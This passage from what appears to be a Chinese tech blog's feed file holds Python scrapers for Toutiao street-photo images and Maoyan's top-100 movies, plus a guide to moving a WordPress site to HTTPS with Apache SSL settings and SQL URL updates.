string">"14.29.2.40:80"</span><span class="token punctuation">,</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"221.7.255.167:80"</span><span class="token punctuation">,</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"112.253.22.161:80"</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'user-agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">get_index_page</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>kw<span class="token punctuation">)</span><span class="token punctuation">:</span>    baseUrl <span class="token operator">=</span> <span class="token string">'https://www.toutiao.com/search_content/?'</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'offset'</span><span class="token punctuation">:</span> offset<span class="token punctuation">,</span>        <span class="token string">'format'</span><span class="token punctuation">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>        <span class="token string">'keyword'</span><span class="token punctuation">:</span> kw<span class="token punctuation">,</span>        <span class="token string">'autoload'</span><span class="token punctuation">:</span> <span class="token string">'true'</span><span class="token punctuation">,</span>        <span class="token string">'count'</span><span class="token punctuation">:</span> <span class="token string">'20'</span><span class="token punctuation">,</span>        <span class="token string">'cur_tab'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">'from'</span><span class="token punctuation">:</span> <span class="token string">'search_tab'</span><span class="token punctuation">,</span>        <span class="token string">'pd'</span><span class="token punctuation">:</span> <span class="token string">'synthesis'</span>        <span class="token punctuation">&#125;</span>    dataUrl<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    url <span class="token operator">=</span> baseUrl<span class="token operator">+</span>dataUrl    <span class="token keyword">try</span><span class="token punctuation">:</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>        <span class="token keyword">if</span> rsp<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> rsp<span class="token punctuation">.</span>text        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请求错误"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">parse_index_page</span><span class="token punctuation">(</span>index_text<span class="token punctuation">)</span><span class="token punctuation">:</span>    json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>index_text<span class="token punctuation">)</span>    page_urls<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> json_data <span class="token keyword">and</span> <span class="token string">"data"</span> <span class="token keyword">in</span> json_data<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> dic <span class="token keyword">in</span> json_data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            page_url<span class="token operator">=</span>dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'article_url'</span><span class="token punctuation">)</span>            page_urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>page_url<span class="token punctuation">)</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span>value <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>page_urls<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> value <span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>                page_urls<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">del</span> page_urls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment">#前两台为广告，删除</span>        <span class="token keyword">return</span> page_urls<span class="token keyword">def</span> <span class="token function">get_page</span><span class="token punctuation">(</span>page_url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>page_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>        <span class="token keyword">if</span> rsp<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> rsp<span class="token punctuation">.</span>text        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请求错误"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">parse_page</span><span class="token punctuation">(</span>page_text<span class="token punctuation">)</span><span class="token punctuation">:</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>page_text<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span>    image_title<span class="token operator">=</span>soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get_text    image_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'gallery: JSON.parse\("(.*)"\)|articleInfo:(.*)'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    image_url<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>image_pattern<span class="token punctuation">,</span>page_text<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> image_url<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>            image_url_data<span class="token operator">=</span>image_url<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            image_url_data_1<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'content:(.*)'</span><span class="token punctuation">,</span>image_url_data<span class="token punctuation">)</span>            image_url_data_2<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'[a-zA-z]+://[^\s][^&amp;]*'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>image_url_data_1<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i<span class="token punctuation">,</span>image <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>image_url_data_2<span class="token punctuation">)</span><span class="token punctuation">:</span>                dowload_image<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>                <span class="token string">"title"</span><span class="token punctuation">:</span>image_title            <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            image_url_data<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>image_url<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            sub_images <span class="token operator">=</span> image_url_data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sub_images'</span><span class="token punctuation">)</span>            images <span class="token operator">=</span> <span class="token punctuation">[</span>item<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span> <span class="token keyword">for</span>  item <span class="token keyword">in</span> sub_images<span class="token punctuation">]</span>            <span class="token keyword">for</span> image <span class="token keyword">in</span> images<span class="token punctuation">:</span>                dowload_image<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>                <span class="token string">"title"</span><span class="token punctuation">:</span> image_title            <span class="token punctuation">&#125;</span>    <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"参数错误"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dowload_image</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在下载"</span><span class="token punctuation">,</span>url<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> rsp<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>            save_image<span class="token punctuation">(</span>rsp<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"连接错误"</span><span class="token keyword">def</span> <span class="token function">save_image</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    img_path <span class="token operator">=</span> <span class="token string">'头条街拍图片'</span>  <span class="token comment"># 图片的路径</span>    t_img_name<span class="token operator">=</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 先判断路径是否存在</span>            os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>        t_img_name <span class="token operator">=</span> <span class="token string">'&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>img_path<span class="token punctuation">,</span> os<span class="token punctuation">.</span>sep<span class="token punctuation">,</span> t_img_name<span class="token punctuation">,</span> <span class="token string">".jpeg"</span><span class="token punctuation">)</span>  <span class="token comment"># 组合成图片名称</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>t_img_name<span class="token punctuation">)</span>        f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>t_img_name<span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index_text<span class="token operator">=</span>get_index_page<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">"街拍"</span><span class="token punctuation">)</span>    page_urls <span class="token operator">=</span> parse_index_page<span class="token punctuation">(</span>index_text<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>page_urls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            page_url <span class="token operator">=</span> page_urls<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            page_text<span class="token operator">=</span>get_page<span class="token punctuation">(</span>page_url<span class="token punctuation">)</span>            parse_page<span class="token punctuation">(</span>page_text<span class="token punctuation">)</span>        <span class="token keyword">except</span> TypeError<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> 头条街拍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬取猫眼电影top100</title>
      <link href="2018/12/01/python-maoyan-movie-top100/"/>
      <url>2018/12/01/python-maoyan-movie-top100/</url>
      
        <content type="html"><![CDATA[<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 爬取猫眼电影榜单top100</span><span class="token comment">#地址：http://maoyan.com/board/4</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> retitles <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 电影名字</span>stars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 主演</span>times <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 上映时间</span>scores <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 评分</span><span class="token keyword">def</span> <span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">"http://maoyan.com/board/4"</span><span class="token operator">+</span><span class="token string">"?offset="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span>        headers<span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"</span>        <span class="token punctuation">&#125;</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        html <span class="token operator">=</span> rsp<span class="token punctuation">.</span>text        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span>        dd <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'dd'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> dd<span class="token punctuation">:</span>            movie_title <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment">#print(title.get_text())</span>            titles<span class="token punctuation">.</span>append<span class="token punctuation">(</span>movie_title<span class="token punctuation">)</span>            movie_star <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">'star'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            movie_star<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'主演：(.*)'</span><span class="token punctuation">,</span>movie_star<span class="token punctuation">)</span>            stars<span class="token punctuation">.</span>append<span class="token punctuation">(</span>movie_star<span class="token punctuation">)</span>            movie_time <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">'releasetime'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            movie_time<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'上映时间：(.*)'</span><span class="token punctuation">,</span>movie_time<span class="token punctuation">)</span>            times<span class="token punctuation">.</span>append<span class="token punctuation">(</span>movie_time<span class="token punctuation">)</span>            movie_score_interger <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">'integer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            movie_score_num <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">'fraction'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            movie_score<span class="token operator">=</span>movie_score_interger<span class="token operator">+</span>movie_score_num            scores<span class="token punctuation">.</span>append<span class="token punctuation">(</span>movie_score<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_txt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'maoyan.txt'</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        one_write <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>titles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"--- "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>times<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"--- "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>scores<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"--- "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>stars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>one_write<span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    getList<span class="token punctuation">(</span><span class="token punctuation">)</span>    write_txt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> 猫眼电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress整站实现https</title>
      <link href="2018/09/13/wordpress-https/"/>
      <url>2018/09/13/wordpress-https/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么要把HTTP换成HTTPS"><a href="#为什么要把HTTP换成HTTPS" class="headerlink" title="为什么要把HTTP换成HTTPS"></a>为什么要把HTTP换成HTTPS</h2><p>先大概说一下我们浏览到网页的过程：</p><p>1 首先你要有一台大家都可以访问到的服务器（当然是用你的电脑也可以），并不是说可以访问此服务器的所有资源。裸服务器是不可以是用的，需要安装应用对外提供服务，而应用在服务器上的体现就是端口号。http为80端口，https为443端口号，ftp为21号端口号等。</p><p>2.以http为例，在服务器上安装可以提供网页服务的应用，常见的有Apache，nginx，tomcat，IIS（一般用在winserver上）。这些应用会把网页端的代码转换为我们能看到的页面。其实是将PHP和JAVA等动态语言传递参数到HTML中，再配合CSS和JS的修饰，然后再由浏览器识别。最终就是我们看到的效果。</p><p>3.下面不谈有关代码的事，之谈服务器端和客户端的交互过程。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/6I91BEfcEj.png" alt="6I91BEfcEj.png"></p><p>如图就是HTTP中最简单的交互。http协议工作在TCP层之上，属于应用层协议。交互过程相当于TCP三次握手再加上HTTP协议规定的一些东西。http的诞生使得我们的互联网世界变得极为丰富，但是它有一个很大的缺点，那就是不安全，所有信息都是明文传输。攻击人员通过抓包就可以看的清清楚楚，当然也包括你想对某人说的悄悄话和你的银行卡密码。</p><p>正是由于这种问题，https诞生了。https和http一样也工作在TCP层之上，不过在他们之间还隔着一层东西叫做SSL/TSL。</p><p>这层东西的作用可就大了，可以实现加密，完整性校验，数字签名等功能。</p><p><strong>https简单访问过程</strong></p><p>总之HTTPS会将服务器和客户端之间的内容进行加密。使数据更加安全。</p><p>详细解释过程可看：<br><a href="http://baijiahao.baidu.com/sid=1570143475599137&amp;wfr=spider&amp;for=pc">http://baijiahao.baidu.com/sid=1570143475599137&amp;wfr=spider&amp;for=pc</a></p><h2 id="准备将HTTP变成HTTPS的工具"><a href="#准备将HTTP变成HTTPS的工具" class="headerlink" title="准备将HTTP变成HTTPS的工具"></a>准备将HTTP变成HTTPS的工具</h2><p>实现加密和解密需要三个文件：私钥，公钥和证书链。这三个文件需要我们去向SSL证书提供商申请。</p><p>推荐三款免费的：</p><ul><li>Let’s Encrypt  是国外一个公共的免费SSL项目，由 Linux 基金会托管，它的来头不小，由Mozilla、思科、Akamai、IdenTrust和EFF等组织发起免费三个月，三个月后重新申请即可。</li><li>startSSL  个人免费一年</li><li>沃通   免费两年，证书其实是startSSL发布的</li></ul><p>我是在腾讯云申请的，申请很方面速度也很快，申请地址：</p><p><a href="https://console.cloud.tencent.com/ssl/detail/JwB8tHnV">https://console.cloud.tencent.com/ssl/detail/JwB8tHnV</a></p><p>申请完成后你会得到一个压缩文件，下载下来打开就是想要的文件：</p><p>其中第一个是证书链，第二个是公钥，第三个是私钥。</p><h2 id="服务器端配置SSL"><a href="#服务器端配置SSL" class="headerlink" title="服务器端配置SSL"></a>服务器端配置SSL</h2><p>以apache为例：</p><ol><li><p>安装SSL模块：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo yum install -y mod_ssl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>复制三个文件分别到如下目录:</p><p>私钥：/etc/pki/tls/private/</p><p>公钥和证书链： /etc/pki/tls/certs/</p></li><li><p>修改配置文件：</p></li></ol><p>修改/etc/httpd/conf.d/ssl.conf文件的下面内容：</p>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">SSLProtocol all -SSLv2 -SSLv3SSLCertificateFile     &#x2F;etc&#x2F;pki&#x2F;tls&#x2F;certs&#x2F;2_www.hrwhisper.me.crtSSLCertificateKeyFi&#x2F;etc&#x2F;pki&#x2F;tls&#x2F;private&#x2F;3_www.hrwhisper.me.keySSLCertificateChainFile   &#x2F;etc&#x2F;pki&#x2F;tls&#x2F;certs&#x2F;1_root_bundle.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li><p>重启httpd服务：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">service httpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到这里已经实现了网站的https,将网址http改为https已经可以访问。并且浏览器前面的锁是绿色的，代表网站是可信任的。</p></li></ol><h2 id="wordpress端需要修改和注意的"><a href="#wordpress端需要修改和注意的" class="headerlink" title="wordpress端需要修改和注意的"></a>wordpress端需要修改和注意的</h2><p>我们只是实现了网站的https，但是wordpress后台中的一些关键项也要设为https。例如：</p><p>设置完成后可能出现网站打不开的情况，还需要更新数据库。</p><p><strong>更新方法:</strong></p><p> 在数据库中执行如下sql语句：</p> <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">UPDATE wp_posts SET post_content &#x3D; REPLACE(post_content, &#39;http:&#x2F;&#x2F;www.handbye.cn&#39;,&#39;https:&#x2F;&#x2F;handbye.cn&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 将里面对应的网址换成你自己的。</p><p> 如果评论或者文章自定义字段中也使用过网站的地址，那么还要执行以下语句：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">UPDATE wp_comments SET comment_content &#x3D; REPLACE(comment_content, &#39;http:&#x2F;&#x2F;www.handbye.cnt&#39;,&#39;https:&#x2F;&#x2F;handbye.cn&#39;);UPDATE wp_comments SET comment_author_url &#x3D; REPLACE(comment_author_url, &#39;http:&#x2F;&#x2F;www.handbye.cn&#39;,&#39;https:&#x2F;&#x2F;handbye.cn&#39;);UPDATE wp_postmeta SET meta_value &#x3D; REPLACE(meta_value, &#39;http:&#x2F;&#x2F;handbye.cnt&#39;,&#39;https:&#x2F;&#x2F;handbye.cn&#39;);UPDATE wp_termmeta SET meta_value &#x3D; REPLACE(meta_value, &#39;http:&#x2F;&#x2F;www.handbye.cn&#39;,&#39;https:&#x2F;&#x2F;handbye.cn&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>将里面对应的网址换成你自己的。</p><p>这时就已经大工告成！！</p><h2 id="进一步优化"><a href="#进一步优化" class="headerlink" title="进一步优化"></a>进一步优化</h2><p>将之前已经收录的http链接301重定向到https,新站点请忽略：<br>（修改.htaccess文件）</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteCond %&#123;HTTPS&#125; offRewriteRule ^(.*)$ https:&#x2F;&#x2F;%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [R&#x3D;301,L]&lt;&#x2F;IfModule&gt;&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteCond %&#123;HTTPS&#125; offRewriteRule ^(.*)$ https:&#x2F;&#x2F;%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [R&#x3D;301,L]&lt;&#x2F;IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用插件来实现：</p><p>推荐插件：<strong>HTTPS Redirection</strong></p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.boke8.net/wordpress-https.html">https://www.boke8.net/wordpress-https.html</a></p><p><a href="https://www.hrwhisper.me/secure-your-wordpress-with-a-free-ssl-certificate/">https://www.hrwhisper.me/secure-your-wordpress-with-a-free-ssl-certificate/</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wordpress </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ensp常见问题解决办法汇总</title>
      <link href="2018/07/23/ensp-common-issues/"/>
      <url>2018/07/23/ensp-common-issues/</url>
      
